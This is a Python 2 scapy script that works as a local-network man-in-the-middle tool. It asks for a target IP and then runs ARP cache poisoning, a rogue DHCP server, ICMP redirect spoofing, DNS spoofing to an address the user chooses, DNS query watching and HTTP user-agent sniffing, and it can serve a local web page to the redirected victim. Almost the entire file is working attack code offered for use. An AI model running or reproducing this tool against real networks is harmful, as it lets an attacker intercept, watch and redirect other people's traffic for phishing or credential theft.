from logging import getLogger, ERROR
getLogger("scapy.runtime").setLevel(ERROR)
from binascii import a2b_hex
from scapy.all import conf, Ether, ARP, srp, arping, IP, UDP, BOOTP, DHCP,  sendp, sniff, send, ICMP, DNSQR, DNSRR, Raw, srp1, DNS, TCP
from SimpleHTTPServer import SimpleHTTPRequestHandler
from time import sleep
import SocketServer
from socket import gethostbyname
from threading import Thread
from sys import argv
from os import listdir, getcwd, remove

conf.verb = 0
all_threads = []
server_thread = []

# Required
my_ip = None
my_mac = None
router_ip = None
router_mac = None
target = None
target_mac = None
Server_Listen = None


def do_update():
    global my_ip, my_mac, router_ip, router_mac
    get_data = Ether()/ARP(op = 1, ptype = 0x800, hwlen = 6, plen = 4)
    my_ip = get_data[ARP].psrc
    my_mac = get_data[Ether].src
    index = my_ip.rfind(".")
    router_ip = my_ip[:index+2]
    try:
        router_data = srp(Ether(src=my_mac)/ARP(op = 1, ptype = 0x800, hwlen = 6, plen = 4, pdst=router_ip), timeout=6)
    except Exception as prablm:
        exit(str(prablm) + "\n[Info] you need to be root")

    if len(router_data[0]) == 0:
        print "Got No ARP Answer From %s" % router_ip
        try:
            router_mac = str(raw_input("Specify an Router MAC Address : "))
        except Exception as problm:
            exit(problm)
        except:
            exit()
        if not router_mac:
            exit("No Router MAC Address Specified")
    else:
        try:
            router_mac = router_data[0][0][0].dst
        except Exception as sec_problm:
            exit(sec_problm)
    del router_data
    del get_data
    del index

if not len(argv[1:]):
    pass
elif "-h" in argv or "--h" in argv or "help" in argv:
    exit("Help:\n-i   (Optional) Set Interface.\n-a   Disable to Sniff for User Agents.\n-s   Perform ARP Scan.\n-e   Disable to Start HTTP-Server.\n-u   Run update.")

elif "-i" in argv and len(argv) > 2 or "-I" in argv and len(argv) > 2:
    try:
        conf.iface = argv[2]
    except Exception as prblm:
        exit(prblm)
    print "Iface ", conf.iface

elif "-a" in argv or "-A" in argv:
    pass

elif "-s" in argv or "-S" in argv:
    get_data = Ether()/ARP(op = 1, ptype = 0x800, hwlen = 6, plen = 4)
    my_ip = get_data[ARP].psrc
    index = my_ip.rfind(".")
    print "ARP Scan %s%s" % (my_ip[:index+1], "/24")
    try:
        ans, unans = arping(my_ip[:index+1] + "*" , verbose=0, timeout=10)
    except Exception as problm:
        exit(str(problm) + "\n[Info] you need to be root")
    if len(ans) > 0:
        for i in ans:
            print i[0][ARP].pdst + " -- " + i[1][Ether].src
    else:
        print "Got no Response"
    exit()

elif "-e" in argv or "-E" in argv:
    pass

elif "-u" in argv or "-U" in argv:
    if "mitm_data" in listdir("."):
        remove("mitm_data")
    else:
        pass
    file_handle = open("mitm_data", "a+r+w")
    do_update()
    file_handle.write("""Note if you use other interfaces you need to change the MAC-Address field\n\nMy_IP-Address #""" + my_ip + """#\nMy_MAC-Address #""" + my_mac + """#\nrouter #""" + router_ip + """#\nrouter_mac #""" + router_mac + """#""")
    exit("[*] Done")

else:
    exit("Help:\n-i   (Optional) Set Interface.\n-a   Disable to Sniff for User Agents.\n-s   Perform ARP Scan.\n-e   Disable to Start HTTP-Server.\n-u   Run update.")

if "mitm_data" in listdir("."):
    try:
        file_handle = open("mitm_data", "r+w").readlines()
    except IOError as prblm:
        exit("You need to be Root")
    except Exception as prblm:
        exit(prblm)
    for i in range(1, 6):
        i += 1
        if i == 2:
            my_ip = file_handle[i][file_handle[i].find(chr(19+ord('\x16')-6)[0])+1:len(file_handle[i])-int(0x02)]
        elif i == 3:
            my_mac = file_handle[i][file_handle[i].find(chr(19+ord('\x16')-6)[0])+1:len(file_handle[i])-int(0x02)]
        elif i == 4:
            router_ip = file_handle[i][file_handle[i].find(chr(19+ord('\x16')-6)[0])+1:len(file_handle[i])-int(0x02)]
        elif i == 5:
            router_mac = file_handle[i][file_handle[i].find(chr(19+ord('\x16')-6)[0])+1:len(file_handle[i])-int(0x02)]
else:
    do_update()

#   #   Threads   #   #
class ARP_Poison(Thread):
    def __init__(self):
        Thread.__init__(self)

        # tell router that we want the packets 
        self.first = Ether(src = my_mac, dst = router_mac) # hwsrc = "aa:aa:aa:aa:aa:aa"
        self.next = ARP(hwtype = 1, ptype = 0x800, op = 2, hwsrc = my_mac, psrc = target, hwdst = target_mac, pdst = router_ip)
        self.bad_arp = self.first/self.next

        # tell target that we want the packets
        self.first = Ether(src=my_mac, dst = target_mac)
        self.next = ARP(hwtype = 1, ptype = 0x800, op = 2, hwsrc = my_mac, psrc = router_ip, hwdst = target_mac, pdst = target)
        self.bad_arp2 = self.first/self.next

    def run(self):
        print "[*] ARP Cache Poison Started\n"
        while 1:
            sendp(self.bad_arp)
            sendp(self.bad_arp2)
            sleep(8)

class DHCP_Spoof(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.dhcp_reply=Ether(dst=target_mac, src=my_mac)/IP(version=4, ihl=5, ttl=64, proto="udp", src=my_ip)
        self.dhcp_reply/=UDP(sport=67, dport=68)
        self.clien_mac=target_mac.replace(":", "")
        self.clien_mac=a2b_hex(self.clien_mac)
        self.dhcp_reply/=BOOTP(op=2, hops=0, hlen=6, htype=1, ciaddr="0.0.0.0", yiaddr=target, siaddr=my_ip, giaddr="0.0.0.0", chaddr=self.clien_mac)
        self.dhcp_reply/=DHCP(options=[('message-type', 5), ("server_id", my_ip), ("lease_time", 1814400), ("router", my_ip), ("name_server", my_ip), ('end')])

    def listen(self, pkt):
        if pkt.haslayer(DHCP):
            if pkt[BOOTP].op == 1:
                print "DHCP Request from ", pkt[Ether].src
                self.dhcp_reply[IP].dst= pkt[IP].src
                self.dhcp_reply[BOOTP].xid = pkt[BOOTP].xid
                sendp(self.dhcp_reply, count=10)
    def run(self):
        print "[*] Listening for DHCP Requests"
        sniff(prn=self.listen)

class ICMP_Spoof(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.icmp_redirect = IP(src = router_ip, dst = target)/ICMP(type = 5, code = 1, gw = my_ip)/IP(src = target, dst = router_ip)
    def run(self):
        print "[*] Sending ICMP Redirect Messages to %s\n" % target
        while 1:
            send(self.icmp_redirect)
            sleep(10)

class DNS_Spoof(Thread):
    def __init__(self, Website):
        Thread.__init__(self)
        self.Website = Website
        self.query_ans = Ether()/IP()/UDP()/DNS(qr = 1, qdcount = 1, ancount = 1)/DNSQR()/DNSRR(ttl = 64, rdlen = 4, rdata = self.Website)
    def Listen_for_Target(self, pkt):
        if pkt.haslayer(DNSQR) and pkt.haslayer(DNS) and pkt.haslayer(IP):
            if pkt[DNS].qr == 0 and pkt[DNSQR].qtype == 1 and pkt[IP].src == target:
                self.query_ans[Ether].src=my_mac
                self.query_ans[Ether].dst=target_mac
                self.query_ans[IP].src=pkt[IP].dst
                self.query_ans[IP].dst=pkt[IP].src
                self.query_ans[UDP].sport=pkt[UDP].dport
                self.query_ans[UDP].dport =pkt[UDP].sport
                self.query_ans[DNS].id = pkt[DNS].id
                self.query_ans[DNSQR].qname=pkt[DNSQR].qname
                self.query_ans[DNSRR].rrname=pkt[DNSQR].qname
                sendp(self.query_ans)
    def Listen_for_All(self, pkt):
        if pkt.haslayer(DNSQR) and pkt.haslayer(DNS):
            if pkt[DNS].qr == 0 and pkt[DNSQR].qtype == 1:
                self.query_ans[Ether].src=my_mac
                self.query_ans[Ether].dst=pkt[Ether].src
                self.query_ans[IP].src=pkt[IP].dst
                self.query_ans[IP].dst=pkt[IP].src
                self.query_ans[UDP].sport=pkt[UDP].dport
                self.query_ans[UDP].dport =pkt[UDP].sport
                self.query_ans[DNS].id = pkt[DNS].id
                self.query_ans[DNSQR].qname=pkt[DNSQR].qname
                self.query_ans[DNSRR].rrname=pkt[DNSQR].qname
                sendp(self.query_ans)
    def run(self):
        print "[*] Listening for DNS Querys\n"
        sniff(prn=self.Listen_for_Target, filter="udp")

class DNS_Watcher(Thread):
    def __init__(self, target):
        Thread.__init__(self)
        self.target = target
    def listen(self, pkt):
        if pkt.haslayer(DNSQR) and pkt.haslayer(IP):
            if pkt[IP].src == self.target:
                print pkt[DNSQR].qname
    def run(self):
        sniff(prn = self.listen, filter="udp")

class UserAgentSniff(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.user_agents = {}
    def listen(self, pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
            if pkt[IP].src == target and "User-Agent:" in pkt[Raw].load:
                pkt[Raw].load = pkt[Raw].load[pkt[Raw].load.find("User-Agent:"):]
                if pkt[IP].src not in self.user_agents.keys():
                    self.user_agents[pkt[IP].src] = pkt[Raw].load[:pkt[Raw].load.find("\n")]
                    print "%s -- User Agent:\n%s\n" % (target, self.user_agents[pkt[IP].src])
    def run(self):
        sniff(prn = self.listen, filter="port 80")
try:
    target = str(raw_input("Target \\\: "))
    if not "." in target: exit()
    if target == my_ip: exit("You cant set the Target to Your IP\nYou " + my_ip + " Target " + target)
    try:
        ans = srp1(Ether(src=my_mac)/IP(src=my_ip, dst=target)/ICMP(type=8), timeout=5)
        if ans:
            target_mac = ans[Ether].src

    except Exception as prblm:
        exit(prblm)
    if not target_mac:
        try:
            ans, unans = srp(Ether()/ARP(op=1, psrc=my_ip, pdst=target), timeout=5)
            if len(ans) == 0:
                print "Looks like %s is Inactive or not Online" % target
                target_mac = str(raw_input("Target Mac-Address \\\: "))
            else:
                target_mac = ans[0][1].src
        except Exception as resolv_prblm:
            exit(resolv_prblm)
    if not ":" in target_mac: exit()
    first_choice = int(raw_input("Type:\n\t1. ARP\n\t2. DHCP\n\t3. ICMP\n\\\:  "))
    if first_choice not in (1, 2, 3): exit()
except ValueError:
    exit("1, 2, or 3")
except Exception as prblm:
    exit(prblm)

if first_choice == 1:
    ARP_type = ARP_Poison()

elif first_choice == 2:
    DHCP_type = DHCP_Spoof()

elif first_choice == 3:
    ICMP_type = ICMP_Spoof()

else:
    exit(first_choice+" is not a choice!\n")
try:
    next_choice = int(raw_input("Method:\n\t1. DNS Spoofing\n\t2. Watch DNS Querys\n\\\:  "))
except:
    exit()

if next_choice == 1:
    my_website = str(raw_input("Redirect To \\\: "))
    if "www" in my_website:
        try:
            my_website = gethostbyname(my_website)
            print my_website
        except Exception as prblm:
            exit(prblm)
    DNS_Listen = DNS_Spoof(my_website)

elif next_choice == 2:
    DNS_Stalk = DNS_Watcher(target)

else:
    exit(next_choice + " is not a choice!\n")

class HTTP_Server(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.HTTP_TCP_Server = None
    def check_dependency(self):
        if "index.html" not in listdir("."):
            print "index.html was not found in %s" % getcwd()
            self.continue_start = str(raw_input("Continue (yes, no) "))
            if self.continue_start.startswith("y") or self.continue_start.startswith("Y"):
                self.start()
            else:
                exit()
        else:
            self.start()
    def run(self):
        try:
            self.PORT = 80
            self.get_data = Ether()/ARP(op = 1, ptype = 0x800, hwlen = 6, plen = 4)
            self.my_ip = self.get_data[ARP].psrc
            self.Handler = SimpleHTTPRequestHandler
            self.HTTP_TCP_Server = SocketServer.TCPServer((self.my_ip, self.PORT), self.Handler)
            print "[*] HTTP Server bind to %s\n" % self.my_ip
            self.HTTP_TCP_Server.serve_forever()
        
        except Exception as iFail:
            print iFail
            if self.HTTP_TCP_Server:
                self.HTTP_TCP_Server.shutdown()
            exit()

if __name__ == "__main__":
    if not "-e" in argv and not "-E" in argv:
        Server_for_HTTP = HTTP_Server()
        all_threads.append(Server_for_HTTP)
        Server_for_HTTP.check_dependency()

    if first_choice == 1 and target != my_ip:
        all_threads.append(ARP_type)
        ARP_type.start()

    elif first_choice == 2:
        all_threads.append(DHCP_type)
        DHCP_type.start()

    elif first_choice == 3:
        all_threads.append(ICMP_type)
        ICMP_type.start()

    if next_choice == 1:
        all_threads.append(DNS_Listen)
        DNS_Listen.start()

    elif next_choice == 2:
        all_threads.append(DNS_Stalk)
        DNS_Stalk.start()

    if not "-a" in argv and not "-A" in argv:
        Get_agent =  UserAgentSniff()
        all_threads.append(Get_agent)
        Get_agent.start()
    try:
        while 1:
            pass
    except KeyboardInterrupt:
        for i in all_threads:
            i._Thread__stop()
        try:
            Server_for_HTTP.HTTP_TCP_Server.shutdown()
        except NameError:
            pass
        except Exception as prblm:
            print prblm
        
        if first_choice == 1:
            print "[*] Clearing %s ARP Cache ... for 20 sec" % target
            # tell router right info
            first = Ether(src = target_mac, dst=router_mac)
            next = ARP(hwtype = 1, ptype = 0x800, op = 2, hwsrc = target_mac, psrc = target, hwdst = router_mac, pdst = router_ip)
            good_arp = first/next

            # tell target right info
            first = Ether(src = router_mac, dst = target_mac)
            next = ARP(hwtype = 1, ptype = 0x800, op = 2, hwsrc = router_mac, psrc = router_ip, hwdst = target_mac, pdst = target)
            good_arp2 = first/next

            cntr=0
            while cntr < 20:
                sendp(good_arp)
                sendp(good_arp2)
                sleep(1)
                cntr+=1
        else:
            print "[*] Clearing Target Routing Table ..." 
        # redirect target to original router
        packet = IP(src = router_ip, dst = target)/ICMP(type = 5, code = 1, gw = router_ip)/IP(src = target, dst= router_ip)
        send(packet)
